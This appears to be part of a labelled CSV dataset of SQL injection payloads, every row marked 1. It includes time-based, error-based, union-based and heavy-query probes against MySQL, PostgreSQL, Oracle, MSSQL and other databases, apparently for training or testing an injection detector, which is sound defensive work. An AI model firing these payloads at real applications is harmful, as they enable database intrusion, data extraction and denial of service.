,payload,label
14215,"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""sfbc""=""sfbc",1
14216,"1"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
14217,"1)) as kgit where 1919=1919 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
14218,"1%""))) or elt(6272=6272,sleep(5)) and (((""%""=""",1
14219,"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('xcnj'='xcnj",1
14220,"1') as rqfq where 7077=7077 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
14221,"1') union all select null,null,null,null--",1
14222,"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'zenl' like 'zenl",1
14223,1');if(2697=2008) select 2697 else drop function jcoo--,1
14224,1))) and 2006=2006,1
14225,"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('ffzv'='ffzv",1
14226,"1"");select sleep(5) and (""innk""=""innk",1
14227,1%' union all select null--,1
14228,-4262%'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',1
14229,1') and 7533=7533,1
14230,"1'+(select 'supo' where 8691=8691;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)+'",1
14231,"1 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
14232,"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'rxdz'='rxdz",1
14233,"-7007) union all select 6704,6704--",1
14234,"-9622' union all select 7208,7208,7208,7208#",1
14235,1;select pg_sleep(5)--,1
14236,"1"") as uuth where 8555=8555 union all select null,null#",1
14237,"1%"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""%""=""",1
14238,"-4764) where 8200=8200 union all select 8200,8200,8200,8200--",1
14239,"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
14240,"1"")) as jrld where 3488=3488;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
14241,"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'adsh'='adsh",1
14242,"-2838"" where 5442=5442 union all select 5442#",1
14243,1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),1
14244,"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('ctbs' like 'ctbs",1
14245,"1"" or elt(5873=5873,sleep(5))#",1
14246,"1"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""cyyh""=""cyyh",1
14247,-6405%'))) or (8459=8459)*4906 and ((('%'=',1
14248,1)) as xbii where 2262=2262 or sleep(5)--,1
14249,"1%""))) union all select null,null,null,null,null--",1
14250,1%')));(select * from (select(sleep(5)))acdk)#,1
14251,"1%""));begin dbms_lock.sleep(5); end and ((""%""=""",1
14252,"1);select like('abcdefg',upper(hex(randomblob(500000000/2))))",1
14253,"1))) union all select null,null,null--",1
14254,"1"" where 8241=8241 union all select null,null,null#",1
14255,-5211 union all select 1754--,1
14256,"1"") where 7471=7471 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
14257,"1';iif(8214=4954,1,1/0)",1
14258,"1' where 7910=7910;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
14259,"1 union all select null,null,null,null,null,null,null,null#",1
14260,"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",1
14261,1')) as fqia where 1936=1936 and (select * from (select(sleep(5)))fzno)--,1
14262,"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",1
14263,1%') rlike (select * from (select(sleep(5)))sgvo) and ('%'=',1
14264,"1' in boolean mode) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)#",1
14265,"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('fgox' like 'fgox",1
14266,1';begin dbms_lock.sleep(5); end and 'wdce'='wdce,1
14267,"1"" where 2878=2878 union all select null,null,null,null,null#",1
14268,"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fmkz' like 'fmkz",1
14269,1'||(select 'ilkr' from dual where 9296=9296;select case when 7717=7717 then 1 else null end--,1
14270,1' where 4253=4253;waitfor delay '0:0:5'--,1
14271,"1""))) union all select null,null,null,null,null#",1
14272,"1',(select (case when (9644=9644) then dbms_pipe.receive_message(chr(75)||chr(78)||chr(104)||chr(98),5) else 1/(select 0 from dual) end) from dual)",1
14273,"1"" or 8466=benchmark(5000000,md5(0x694a4745))",1
14274,"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""jzsb""=""jzsb",1
14275,1' where 1652=1652 and sleep(5)#,1
14276,"1"" where 4073=4073 rlike (select (case when (8716=4281) then 1 else 0x28 end))--",1
14277,1));select (case when (6843=2657) then 6843 else 6843*(select 6843 from information_schema.character_sets) end)#,1
14278,"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('jhxh'='jhxh",1
14279,"1%' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and '%'='",1
14280,"1"");select pg_sleep(5)--",1
14281,"1"") where 2570=2570 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
14282,1'||(select 'vdeo' where 4355=4355;(select * from (select(sleep(5)))acdk)#,1
14283,"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('owga' like 'owga",1
14284,-6865) or (8459=8459)*4906 and (6107=6107,1
14285,1%') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',1
14286,"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'owwf'='owwf",1
14287,"1%"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
14288,"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
14289,"1"" or (select * from (select(sleep(5)))ydpu) and ""pxix""=""pxix",1
14290,"1%"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""%""=""",1
14291,"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'mlmu'='mlmu",1
14292,"1'+(select 'nmhy' where 2919=2919 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
14293,1%')) and 2006=2006,1
14294,"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""pxbk"" like ""pxbk",1
14295,"1'+(select ttae where 4601=4601 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))+'",1
14296,"-3518) union all select 1877,1877,1877,1877#",1
14297,"1)) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((3626=3626",1
14298,"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'lckw'='lckw",1
14299,"1""))) and 4124=7245 and (((""tuom""=""tuom",1
14300,"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('lgcw'='lgcw",1
14301,"1)) as cusv where 4871=4871 and elt(1210=1210,sleep(5))--",1
14302,1)) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((7594=7594,1
14303,"1"") or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
14304,"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('qvqf'='qvqf",1
14305,"1"") as kfvy where 7305=7305 or sleep(5)--",1
14306,"1"")) rlike sleep(5)#",1
14307,1')));select sleep(5) and ((('thqr' like 'thqr,1
14308,1) where 6725=6725 and 1553=7419,1
14309,"1 where 4940=4940;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
14310,-4758%')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('%'=',1
14311,"1) union all select null,null,null,null,null,null,null,null,null,null#",1
14312,1'+(select 'tbfj' where 4016=4016;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
14313,"1' in boolean mode) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#",1
14314,"1')) as lxjs where 6503=6503 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
14315,"1"") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""imlx""=""imlx",1
14316,"1' in boolean mode) union all select null,null,null,null,null#",1
14317,-2625')) or 3038=3038,1
14318,"1'+(select kgon where 9014=9014 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))+'",1
14319,"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('juhi' like 'juhi",1
14320,"-9054"") as rgyu where 3792=3792 order by 1--",1
14321,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",1
14322,-8292%') or 8571=8571--,1
14323,"1%"");select benchmark(5000000,md5(0x4c4d6142)) and (""%""=""",1
14324,"-3731'))) or elt(7540=1412,1412) and ((('iwch'='iwch",1
14325,"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""qwdi""=""qwdi",1
14326,"1'||(select 'rqzu' from dual where 9516=9516 or elt(5873=5873,sleep(5))#",1
14327,"1%'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",1
14328,"1"") as lrew where 6067=6067 union all select null,null,null,null,null,null,null#",1
14329,"1"" and elt(3114=3114,sleep(5))#",1
14330,"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""qyew""=""qyew",1
14331,"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (8503=8503",1
14332,1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- knpw,1
14333,"1%"";select (case when (7019=1998) then 7019 else 7019*(select 7019 from mysql.db) end)#",1
14334,"-7743"" or 9323=9323#",1
14335,1')));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
14336,"-2263') where 7931=7931 union all select 7931,7931,7931--",1
14337,"1"") where 1807=1807;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
14338,-2784) where 5261=5261 or 3472=1728#,1
14339,1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('czqk' like 'czqk,1
14340,-3648' where 4629=4629 order by 1--,1
14341,"1',(case when 3598=2118 then 1 else null end)",1
14342,"1') where 1600=1600 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
14343,"1'+(select 'zxxh' where 4065=4065 and 8635=(select count(*) from generate_series(1,5000000))--",1
14344,"1"")) as ccjk where 1932=1932 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
14345,1')) and (select * from (select(sleep(5)))fzno) and (('vpqr'='vpqr,1
14346,"-3074')) union all select 6131,6131,6131,6131,6131,6131,6131--",1
14347,"1') where 9454=9454 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
14348,"1'||(select 'bnaz' from dual where 7168=7168 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
14349,"1,iif(7475=7475,1,1/0)",1
14350,"1')) as ewyk where 4828=4828 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
14351,"-3596') union all select 5349,5349,5349,5349,5349,5349#",1
14352,1%' and 9198=9198--,1
14353,"(select concat(0x7171706a71,(select (elt(7381=7381,1))),0x717a767a71))",1
14354,"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'bkcs'='bkcs",1
14355,1) and 5196=9002,1
14356,"1%""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
14357,"-1084 where 1181=1181 or make_set(9354=9354,7185)--",1
14358,"1%"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""",1
14359,-5152')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('jumr' like 'jumr,1
14360,"1' where 5251=5251 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
14361,"-4480') where 4661=4661 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
14362,"1') where 1577=1577 union all select null,null,null,null,null,null#",1
14363,"1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+'",1
14364,"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'pphf'='pphf",1
14365,"1%'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",1
14366,-6233') where 9820=9820 or 3038=3038,1
14367,1') where 3588=3588;begin user_lock.sleep(5); end--,1
14368,-3107') where 7782=7782 or 8571=8571--,1
14369,1') and 1987=3756#,1
14370,1' where 2145=2145;select sleep(5)#,1
14371,1)) and sleep(5) and ((9084=9084,1
14372,"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""vzft""=""vzft",1
14373,"1%')));iif(5257=5257,1,1/0)",1
14374,"-7749"" or (2689=7481)*7481",1
14375,"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)# yrpn",1
14376,1' and 1661=1244 and 'dcha'='dcha,1
14377,"1"") where 5065=5065;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
14378,"1""));select count(*) from generate_series(1,5000000)--",1
14379,-6487) or 6872=6872 and (7688=7688,1
14380,"-4305) as ldrt where 2567=2567 union all select 2567,2567,2567,2567,2567,2567,2567#",1
14381,"1)) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((8867=8867",1
14382,"1' where 7613=7613;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
14383,1')) as jtmf where 3937=3937;select case when 7717=7717 then 1 else null end--,1
14384,1'||(select 'goen' from dual where 8586=8586;select (case when (2132=8969) then 1 else 2132*(select 2132 from master..sysdatabases) end)--,1
14385,"-1376%""))) or 3458=9503 and (((""%""=""",1
14386,-6129) as vuze where 1565=1565 or (8459=8459)*4906--,1
14387,"1' where 1031=1031 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1
14388,1')));if(3245=6168) select 3245 else drop function nafj--,1
14389,"-3707""))) or 8571=8571--",1
14390,"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
14391,"-4047'||(select 'rqta' from dual where 9743=9743 union all select 9743,9743,9743#",1
14392,1') as uwmy where 6980=6980;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
14393,"1%"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",1
14394,"-8133') union all select 6417,6417,6417,6417,6417,6417,6417,6417--",1
14395,"1'||(select 'zifu' from dual where 4822=4822 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
14396,1) as ozga where 4002=4002 and 6969=(select 6969 from pg_sleep(5))--,1
14397,1');select pg_sleep(5) and ('itgc'='itgc,1
14398,"1%""));select * from generate_series(2382,2382,case when (2382=4352) then 1 else 0 end) limit 1--",1
14399,1);begin user_lock.sleep(5); end,1
14400,"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('jylk'='jylk",1
14401,"-7884"" where 3297=3297 or 2492=6158",1
14402,1)) as lkqx where 6468=6468 or (select * from (select(sleep(5)))sddo)#,1
14403,1) where 9344=9344;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
14404,1');waitfor delay '0:0:5',1
14405,1') or 4240=(select 4240 from pg_sleep(5))--,1
14406,"-3126)) union all select 6718,6718,6718,6718,6718--",1
14407,"1')) as efmy where 7299=7299 and 8635=(select count(*) from generate_series(1,5000000))--",1
14408,"-9361"")) union all select 3112#",1
14409,1'));(select * from (select(sleep(5)))srmq) and (('nbzf' like 'nbzf,1
14410,"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'zlxw'='zlxw",1
14411,"1'||(select 'baur' from dual where 9384=9384 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
14412,"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('lmoh' like 'lmoh",1
14413,1' where 4115=4115;select (case when (2501=4688) then 2501 else cast(1 as int)/(select 0 from dual) end) from dual--,1
14414,"1"") where 1144=1144 and 2006=2006",1
14415,1%')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
14416,1' and (5116=1602)*1602,1
14417,"1%"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",1
14418,"1' and 8407=(select count(*) from generate_series(1,5000000)) and 'mnbg' like 'mnbg",1
14419,"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('drvk' like 'drvk",1
14420,1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'=',1
14421,"-5041'))) union all select 4820,4820,4820,4820,4820,4820--",1
14422,1') where 7903=7903;select (case when (8841=9675) then 8841 else cast(1 as int)/(select 0 from dual) end) from dual--,1
14423,1') as bihs where 4197=4197;select pg_sleep(5)--,1
14424,"1')));iif(1149=4765,1,1/0)",1
14425,"1%"");select count(*) from generate_series(1,5000000) and (""%""=""",1
14426,"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",1
14427,"1')) union all select null,null,null--",1
14428,"1"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""gvlc"" like ""gvlc",1
14429,"1'||(select 'ukfj' where 7133=7133 union all select null,null,null#",1
14430,"1'||(select 'ufgs' where 9670=9670 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",1
14431,"-9487)) as rvck where 9404=9404 or make_set(8921=6045,6045)--",1
14432,"1%"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""",1
14433,"1%')) or 8421=(select count(*) from generate_series(1,5000000)) and (('%'='",1
14434,"1"") union all select null,null,null,null--",1
14435,"1')) as qhpv where 7049=7049 and make_set(8403=8403,8899)--",1
14436,1')) and 4595=4595#,1
14437,"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('zfrs'='zfrs",1
14438,"-8073))) union all select 4481,4481,4481,4481--",1
14439,1%')) and (select * from (select(sleep(5)))fzno) and (('%'=',1
14440,"1'||(select 'kfyh' where 4737=4737 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'",1
14441,"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('zdkn'='zdkn",1
14442,"-4522"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""mbkq""=""mbkq",1
14443,1%' and 4595=4595#,1
14444,"1')) as wdor where 7426=7426;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
14445,-9456%'))) order by 1#,1
14446,"1');iif(5257=5257,1,1/0)",1
14447,"1' in boolean mode) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)#",1
14448,-6298' or 4724=4876,1
14449,"-1876'||(select 'itfc' from dual where 9584=9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",1
14450,"1'||(select 'ymez' from dual where 9870=9870 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
14451,"1)));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
14452,"1') where 6274=6274 or 8156=(select count(*) from generate_series(1,5000000))--",1
14453,"1"" where 3933=3933 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
14454,"1%"") waitfor delay '0:0:5'--",1
14455,"1%"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",1
14456,"1') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
14457,-5389'||(select 'gggl' where 1020=1020 union all select 1020#,1
14458,"1"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
14459,-1190' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'yxry' like 'yxry,1
14460,"1"") or elt(5873=5873,sleep(5))#",1
14461,-6100') as kvfc where 2377=2377 or 6872=6872--,1
14462,"1%""))) union all select null,null#",1
14463,"-9634'))) union all select 4141,4141#",1
14464,"1%""));select benchmark(5000000,md5(0x4c4d6142)) and ((""%""=""",1
14465,"1%') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('%'='",1
14466,"1"" where 9461=9461;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
14467,1%')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('%'=',1
14468,"1)) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((7200=7200",1
14469,"1) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
14470,"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))-- kegk",1
14471,1') where 2227=2227;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
14472,"1 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
14473,-5470')) or (8459=8459)*4906 and (('oeam'='oeam,1
14474,"1%"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
14475,1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('opyp'='opyp,1
14476,"1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('cbwx'='cbwx",1
14477,1 and (3020=3020)*6703-- zsnl,1
14478,"-9861' union all select 5710,5710,5710,5710,5710--",1
14479,1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,1
14480,"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# bzoq",1
14481,"1%""))) union all select null,null,null,null,null,null,null#",1
14482,"1"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
14483,"1"") where 9461=9461 union all select null,null,null,null,null,null,null,null,null#",1
14484,"1') where 9516=9516;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
14485,-9340) where 5462=5462 or 3038=3038,1
14486,"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",1
14487,"-2006')) union all select 7852,7852,7852,7852,7852--",1
14488,1'+(select wpkh where 5842=5842;select sleep(5))+',1
14489,1%')) rlike sleep(5) and (('%'=',1
14490,"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""zgoy"" like ""zgoy",1
14491,"1'||(select 'hvqw' from dual where 4423=4423 union all select null,null,null--",1
14492,1') as dqgr where 2427=2427 and (3020=3020)*6703--,1
14493,"1"";(select * from (select(sleep(5)))srmq) and ""wsmz"" like ""wsmz",1
